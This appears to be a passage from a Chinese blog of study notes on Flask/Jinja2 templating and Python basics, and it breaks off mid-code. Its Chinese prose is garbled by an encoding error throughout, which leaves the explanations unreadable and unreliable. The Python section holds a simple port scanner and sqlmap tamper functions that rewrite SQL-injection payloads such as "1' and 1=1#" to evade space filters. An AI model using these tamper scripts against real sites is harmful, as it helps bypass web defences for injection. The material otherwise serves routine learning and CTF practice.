title="æ¨¡æ¿æ¸²æŸ“å’Œå‚æ•°"></a>æ¨¡æ¿æ¸²æŸ“å’Œå‚æ•°</h3><p>1.å¦‚ä½•æ¸²æŸ“æ¨¡æ¿ï¼š</p><ul><li>æ¨¡æ¿æ”¾åœ¨<code>templates</code>æ–‡ä»¶å¤¹ä¸‹</li><li>ä»<code>flask</code>ä¸­å¯¼å…¥<code>render_template</code>å‡½æ•°ã€‚</li><li>åœ¨è§†å›¾å‡½æ•°ä¸­ï¼Œä½¿ç”¨<code>render_template</code>å‡½æ•°ï¼Œæ¸²æŸ“æ¨¡æ¿ã€‚æ³¨æ„ï¼šåªéœ€è¦å¡«å†™æ¨¡æ¿çš„åå­—ï¼Œä¸éœ€è¦å¡«å†™<code>templates</code>è¿™ä¸ªæ–‡ä»¶å¤¹çš„è·¯å¾„ã€‚</li></ul><p>2.æ¨¡æ¿ä¼ å‚ï¼š</p><ul><li>å¦‚æœåªæœ‰ä¸€ä¸ªæˆ–è€…å°‘é‡å‚æ•°ï¼Œç›´æ¥åœ¨<code>render_template</code>å‡½æ•°ä¸­æ·»åŠ å…³é”®å­—å‚æ•°å°±å¯ä»¥äº†ã€‚</li><li>å¦‚æœæœ‰å¤šä¸ªå‚æ•°çš„æ—¶å€™ï¼Œé‚£ä¹ˆå¯ä»¥å…ˆæŠŠæ‰€æœ‰çš„å‚æ•°æ”¾åœ¨<strong>å­—å…¸</strong>ä¸­ï¼Œç„¶ååœ¨<code>render_template</code>ä¸­ï¼Œ<br><strong>ä½¿ç”¨ä¸¤ä¸ªæ˜Ÿå·ï¼ŒæŠŠå­—å…¸è½¬æ¢æˆå…³é”®å‚æ•°ä¼ é€’è¿›å»ï¼Œè¿™æ ·çš„ä»£ç æ›´æ–¹ä¾¿ç®¡ç†å’Œä½¿ç”¨ã€‚</strong></li></ul><p>3.åœ¨æ¨¡æ¿ä¸­ï¼Œå¦‚æœè¦ä½¿ç”¨ä¸€ä¸ªå˜é‡ï¼Œè¯­æ³•æ˜¯ï¼š<code></code></p><p>4.è®¿é—®æ¨¡å‹ä¸­çš„å±æ€§æˆ–è€…æ˜¯å­—å…¸ï¼Œå¯ä»¥é€šè¿‡<code></code>çš„å½¢å¼ï¼Œæˆ–è€…æ˜¯ä½¿ç”¨<code></code>.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">(object)</span>:</span></span><br><span class="line">        name = <span class="string">'pz1o'</span></span><br><span class="line">        age = <span class="number">18</span></span><br><span class="line">    p = Person()</span><br><span class="line">    <span class="comment">#login_url = url_for('users')</span></span><br><span class="line">    <span class="comment">#return redirect(login_url)</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'gender'</span>:<span class="string">'nan'</span>,</span><br><span class="line">        <span class="string">'person'</span>: p</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,**context)</span><br><span class="line">    </span><br><span class="line">&lt;p&gt;&#123;&#123;person.name&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123;person.age&#125;&#125;&lt;/p&gt;</span><br></pre></td></tr></table></figure><h3 id="ifå’Œfor"><a href="#ifå’Œfor" class="headerlink" title="ifå’Œfor"></a>ifå’Œfor</h3><p><strong>if</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> xxx %&#125;</span><br><span class="line">&#123;% <span class="keyword">else</span> %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">if</span> user%&#125;</span><br><span class="line">        &lt;a href="#"&gt;&#123;&#123; user.name &#125;&#125;&lt;/a&gt;</span><br><span class="line">        &lt;a href="#"&gt;æ³¨é”€&lt;/a&gt;</span><br><span class="line">&#123;% <span class="keyword">else</span> %&#125;</span><br><span class="line">        &lt;a href="#"&gt;ç™»å½•&lt;/a&gt;</span><br><span class="line">        &lt;a href="#"&gt;æ³¨å†Œ&lt;/a&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,user=user)</span><br></pre></td></tr></table></figure><p><strong>for</strong></p><p>  å­—å…¸çš„éå†ï¼Œè¯­æ³•å’Œ<code>python</code>ä¸€æ ·ï¼Œå¯ä»¥ä½¿ç”¨<code>items()</code>ã€<code>keys()</code>ã€<code>values()</code>ã€<code>iteritems()</code>ã€<code>iterkeys()</code>ã€<code>itervalues()</code></p>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> k,v <span class="keyword">in</span> user.items() %&#125;</span><br><span class="line">    &lt;p&gt;&#123;&#123; k &#125;&#125;ï¼š&#123;&#123; v &#125;&#125;&lt;/p&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>   åˆ—è¡¨çš„éå†ï¼šè¯­æ³•å’Œ<code>python</code>ä¸€æ ·ã€‚</p>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> website <span class="keyword">in</span> websites %&#125;</span><br><span class="line">    &lt;p&gt;&#123;&#123; website &#125;&#125;&lt;/p&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h3 id="è¿‡æ»¤å™¨"><a href="#è¿‡æ»¤å™¨" class="headerlink" title="è¿‡æ»¤å™¨"></a>è¿‡æ»¤å™¨</h3><p><img src="/2020/08/13/python%E5%BC%80%E5%8F%91/image-20200814161938542.png" alt="image-20200814161938542"></p><p>ä»‹ç»å’Œè¯­æ³•ï¼š</p><ul><li><p>ä»‹ç»ï¼šè¿‡æ»¤å™¨å¯ä»¥å¤„ç†å˜é‡ï¼ŒæŠŠåŸå§‹çš„å˜é‡ç»è¿‡å¤„ç†åå†å±•ç¤ºå‡ºæ¥ã€‚ä½œç”¨çš„å¯¹è±¡æ˜¯å˜é‡ã€‚</p></li><li><p>è¯­æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;avatar|default()&#125;&#125;</span><br></pre></td></tr></table></figure></li></ul><p>defaultè¿‡æ»¤å™¨ï¼šå¦‚æœå½“å‰å˜é‡ä¸å­˜åœ¨ï¼Œè¿™æ—¶å€™å¯ä»¥æŒ‡å®šé»˜è®¤å€¼ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ä¿®æ”¹é»˜è®¤å›¾ç‰‡</span></span><br><span class="line">avatar = <span class="string">'xxx'</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,avatar=avatar)</span><br><span class="line">&lt;img src=<span class="string">'&#123;&#123;avatar|default('</span>...<span class="string">')&#125;&#125;'</span>&gt;</span><br></pre></td></tr></table></figure><p>lengthè¿‡æ»¤å™¨ï¼šæ±‚åˆ—è¡¨æˆ–è€…å­—ç¬¦ä¸²æˆ–è€…å­—å…¸æˆ–è€…å…ƒç»„çš„é•¿åº¦ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç»Ÿè®¡è¯„è®ºæ¡æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">comment = [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">'user'</span>:<span class="string">'pz1o'</span>,</span><br><span class="line">            <span class="string">'content'</span>:<span class="string">'xxx'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">'user'</span>:<span class="string">'lzy'</span>,</span><br><span class="line">            <span class="string">'content'</span>:<span class="string">'xxxx'</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,comments=comment)</span><br><span class="line"></span><br><span class="line">    &lt;p&gt;è¯„è®ºæ•°:&#123;&#123; comments|length &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &#123;% <span class="keyword">for</span> i <span class="keyword">in</span> comments %&#125;</span><br><span class="line">        &lt;li&gt;</span><br><span class="line">            &lt;a href="#"&gt;&#123;&#123; i.user &#125;&#125;&lt;/a&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line">            &lt;a &gt;&#123;&#123; i.content &#125;&#125;&lt;/a&gt;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &lt;/ul&gt;</span><br></pre></td></tr></table></figure><h3 id="ç»§æ‰¿å’Œblock"><a href="#ç»§æ‰¿å’Œblock" class="headerlink" title="ç»§æ‰¿å’Œblock"></a>ç»§æ‰¿å’Œblock</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#pythonä¸­çš„ç»§æ‰¿</span><br><span class="line">class Person(object):</span><br><span class="line">name &#x3D; &#39;pz1o&#39;</span><br><span class="line">age &#x3D; 18</span><br><span class="line">class Student(Person):</span><br><span class="line">pass</span><br></pre></td></tr></table></figure><p>ç»§æ‰¿ä½œç”¨å’Œè¯­æ³•ï¼š</p><ul><li><p>ä½œç”¨ï¼šå¯ä»¥æŠŠä¸€äº›å…¬å…±çš„ä»£ç æ”¾åœ¨çˆ¶æ¨¡æ¿ä¸­ï¼Œé¿å…æ¯ä¸ªæ¨¡æ¿å†™åŒæ ·çš„ä»£ç ã€‚</p></li><li><p>è¯­æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &#39;base.html&#39;%&#125;</span><br></pre></td></tr></table></figure></li></ul><p>blockå®ç°ï¼š</p><ul><li>ä½œç”¨ï¼šå¯ä»¥è®©å­æ¨¡æ¿å®ç°ä¸€äº›è‡ªå·±çš„éœ€æ±‚ã€‚çˆ¶æ¨¡æ¿éœ€è¦æå‰å®šä¹‰å¥½ã€‚</li><li>æ³¨æ„ç‚¹ï¼šå­æ¨¡æ¿ä¸­çš„ä»£ç ï¼Œå¿…é¡»æ”¾åœ¨blockå—ä¸­ã€‚</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block main %&#125;</span><br><span class="line">    &lt;h1&gt;è¿™æ˜¯é¦–é¡µ&lt;&#x2F;h1&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><h1 id="pythonå¼€å‘"><a href="#pythonå¼€å‘" class="headerlink" title="pythonå¼€å‘"></a>pythonå¼€å‘</h1><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">print(<span class="string">'hello pz1o'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#linuxä¸‹æ‰§è¡Œ</span></span><br><span class="line">chmod <span class="number">777</span> python</span><br><span class="line">./a.py</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¼˜åŒ–ç”Ÿæˆpyo</span></span><br><span class="line">python -O -m py_compile a.py</span><br><span class="line">python a.pyo</span><br><span class="line"></span><br><span class="line"><span class="comment">#eval</span></span><br><span class="line">a = <span class="string">'[1,2,3]'</span></span><br><span class="line">b = eval(a)</span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#%æ ¼å¼åŒ–å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">#%c:ascii</span></span><br><span class="line">a = <span class="number">97</span></span><br><span class="line">print(<span class="string">'i am %c'</span>%a)</span><br><span class="line"><span class="comment">#%x:16è¿›åˆ¶</span></span><br><span class="line">print(<span class="string">'i am %x'</span>%a)</span><br><span class="line"><span class="comment">#%o:8è¿›åˆ¶</span></span><br><span class="line">print(<span class="string">'i am %o'</span>%a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ—¥æœŸ</span></span><br><span class="line">time = time.time()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#argså¤„ç†å¤šä½™å‚æ•° argså¤„ç†åˆ—è¡¨å’Œå…ƒç»„ kwargså¤„ç†å­—å…¸</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub</span><span class="params">(num1,num2,*args,**kwargs)</span>:</span></span><br><span class="line">  print(num1-num2)</span><br><span class="line">  print(args)</span><br><span class="line">  print(kwargs)</span><br><span class="line">a = [<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>]</span><br><span class="line">sub(*a)</span><br><span class="line"><span class="number">2</span>  (<span class="number">2</span>,)  &#123;&#125;</span><br><span class="line">sub(<span class="number">5</span>,<span class="number">3</span>,x=<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span>  ()  &#123;<span class="string">'x'</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ–‡ä»¶æ“ä½œ</span></span><br><span class="line"><span class="comment">#råªè¯»  </span></span><br><span class="line"><span class="comment">#wå†™å…¥  åˆ é™¤åŸæ–‡ä»¶ï¼Œé‡æ–°å†™å…¥ï¼Œæ— åˆ™åˆ›å»º</span></span><br><span class="line"><span class="comment">#aå†™å…¥ æ–‡ä»¶æœ«å°¾è¿½åŠ æ–°çš„å†…å®¹ï¼Œæ— åˆ™åˆ›å»º</span></span><br><span class="line"><span class="comment">#a+è¯»å†™  æ–‡ä»¶æœ«å°¾è¿½åŠ æ–°çš„å†…å®¹ï¼Œæ— åˆ™åˆ›å»º</span></span><br><span class="line"><span class="comment">#b æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'yyds.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.read())</span><br><span class="line">CUMTCTF&#123;<span class="number">1</span>b8947a6f2b048c284515d8bd209c83f&#125;</span><br><span class="line">f.seek(<span class="number">7</span>,<span class="number">0</span>)</span><br><span class="line">  print(f.read())</span><br><span class="line">&#123;<span class="number">1</span>b8947a6f2b048c284515d8bd209c83f&#125;</span><br><span class="line"><span class="comment">#f.seek('åç§»é‡','é€‰é¡¹')</span></span><br><span class="line"><span class="comment">#é€‰é¡¹ä¸º0æ—¶ï¼Œä»æ–‡ä»¶å¤´éƒ¨å‘ååç§»</span></span><br><span class="line"><span class="comment">#é€‰é¡¹ä¸º1æ—¶ï¼Œä»å½“å‰ä½ç½®åç§»</span></span><br><span class="line"><span class="comment">#é€‰é¡¹ä¸º2æ—¶ï¼Œä»æ–‡ä»¶æœ«å‘å‰åç§»</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#osæ¨¡å—</span></span><br><span class="line">os.mkdir(<span class="string">'./yyds'</span>)</span><br><span class="line">os.rmdir(<span class="string">'./yyds'</span>)</span><br><span class="line">os.listdir(<span class="string">'./'</span>)</span><br><span class="line">os.getcwd()</span><br><span class="line">os.chdir(<span class="string">'../'</span>)  <span class="comment">#æ”¹å˜å½“å‰å·¥ä½œç›®å½•</span></span><br><span class="line">os.system(<span class="string">'dir'</span>)  <span class="comment">#è¿”å›çŠ¶æ€,0ä¸ºæˆåŠŸ,1ä¸ºå¤±è´¥</span></span><br><span class="line">res = os.popen(<span class="string">'dir'</span>)  <span class="comment">#è¿”å›ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">print(res.read())</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ•æ‰å¼‚å¸¸</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  æ­£å¸¸ä»£ç </span><br><span class="line"><span class="keyword">except</span> é”™è¯¯:</span><br><span class="line">  å¦‚æœå‡ºç°é”™è¯¯ï¼Œæ‰§è¡Œè¿™æ®µä»£ç </span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">  æœ€ç»ˆæ‰§è¡Œè¿™æ®µä»£ç </span><br><span class="line">  </span><br><span class="line"><span class="comment">#ç½‘ç»œç¼–ç¨‹</span></span><br><span class="line"><span class="comment">#éå¸¸ç®€æ˜“çš„æ‰«æå™¨</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">port = [<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">80</span>,<span class="number">135</span>,<span class="number">139</span>,<span class="number">443</span>,<span class="number">1433</span>,<span class="number">3306</span>,<span class="number">3389</span>]</span><br><span class="line">allports = [<span class="number">0</span>,<span class="number">65535</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(ip,port,*args,**kwargs)</span>:</span></span><br><span class="line">    s = socket.socket()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.connect((ip, port))</span><br><span class="line">        print(<span class="string">"[+]The %s port %s is open"</span>%(ip,port))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[+]The %s port %s is closed"</span>%(ip,port))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ports</span><span class="params">(ip,port)</span>:</span><span class="comment">#search some incoming specific parameters</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> port:</span><br><span class="line">        scan(ip,p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(array)</span>:</span></span><br><span class="line">    a = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> array:</span><br><span class="line">        a.append(int(x))</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">portsplus</span><span class="params">(ip,port)</span>:</span><span class="comment">#search the parameters of an interval passed in</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> range(port[<span class="number">0</span>],port[<span class="number">1</span>]+<span class="number">1</span>):</span><br><span class="line">        scan(ip,p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">            print(<span class="string">'''</span></span><br><span class="line"><span class="string">[+]You can read the following rules to use this tool.</span></span><br><span class="line"><span class="string">[+]python scanport.py host ports</span></span><br><span class="line"><span class="string">[+]The Default scanports are 21,22,23,80,135,139,443,1433,3306,3389</span></span><br><span class="line"><span class="string">[+]python scanport.py 127.0.0.1 80,90,3306,3389</span></span><br><span class="line"><span class="string">[+]python scanport.py 127.0.0.1 80-90</span></span><br><span class="line"><span class="string">[+]python scanport.py 127.0.0.1 all</span></span><br><span class="line"><span class="string">            '''</span>)</span><br><span class="line">        <span class="keyword">elif</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">            ports(sys.argv[<span class="number">1</span>],port)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">','</span> <span class="keyword">in</span> sys.argv[<span class="number">2</span>]:</span><br><span class="line">                p = sys.argv[<span class="number">2</span>]</span><br><span class="line">                p = p.split(<span class="string">','</span>)</span><br><span class="line">                ports(ip,convert(p))</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'-'</span> <span class="keyword">in</span> sys.argv[<span class="number">2</span>]:</span><br><span class="line">                p = sys.argv[<span class="number">2</span>]</span><br><span class="line">                p = p.split(<span class="string">'-'</span>)</span><br><span class="line">                portsplus(ip,convert(p))</span><br><span class="line">            <span class="keyword">elif</span> sys.argv[<span class="number">2</span>] == <span class="string">'all'</span>:</span><br><span class="line">                portsplus(ip,allports)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">                scan(ip,port)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">'''</span></span><br><span class="line"><span class="string">[+]There is something wrong!!!</span></span><br><span class="line"><span class="string">        '''</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        print(<span class="string">'''</span></span><br><span class="line"><span class="string">[+]The task has been completed!!!</span></span><br><span class="line"><span class="string">        '''</span>)</span><br><span class="line">        </span><br><span class="line"><span class="comment">#ç±»å’Œå¯¹è±¡</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    __age = <span class="number">18</span> <span class="comment">#ç§æœ‰å±æ€§</span></span><br><span class="line">    name = <span class="string">'name'</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name)</span>:</span></span><br><span class="line">        self.name = name;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">introduce</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"my name is %s,and my age is %d"</span>%((self.name),(self.__age)))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__hello</span><span class="params">(self)</span>:</span><span class="comment">#ç§æœ‰æ–¹æ³•</span></span><br><span class="line">        print(<span class="string">"Hello!! My name is %s"</span>%(self.name))</span><br><span class="line"></span><br><span class="line">pz1o = Person(<span class="string">'pz1o'</span>)</span><br><span class="line">pz1o.introduce()<span class="comment">#å…¬æœ‰æ–¹æ³•è°ƒç”¨</span></span><br><span class="line">print(pz1o._Person__age)<span class="comment">#ç§æœ‰å±æ€§è°ƒç”¨</span></span><br><span class="line">pz1o._Person__hello()<span class="comment">#ç§æœ‰æ–¹æ³•è°ƒç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tamperç¼–å†™</span></span><br><span class="line">--tamper scan.py</span><br><span class="line"><span class="comment">#ç»•ç©ºæ ¼</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload,**kwargs)</span>:</span></span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> payload:</span><br><span class="line">            <span class="keyword">if</span> x.isspace():</span><br><span class="line">                retVal += <span class="string">"/**/"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                retVal += x</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br><span class="line">print(tamper(<span class="string">"1' and 1=1#"</span>))</span><br><span class="line"><span class="comment">#ä¸è¿‡æ»¤å¼•å·é‡Œçš„å†…å®¹</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload,**kwargs)</span>:</span></span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">""</span></span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> payload:</span><br><span class="line">            <span class="keyword">if</span> x == <span class="string">"'"</span> <span class="keyword">or</span> x == <span class="string">'"'</span>:</span><br><span class="line">                flag = <span class="keyword">not</span> flag</span><br><span class="line">                retVal += <span class="string">"'"</span></span><br><span class="line">            <span class="keyword">elif</span> x.isspace() <span class="keyword">and</span> <span 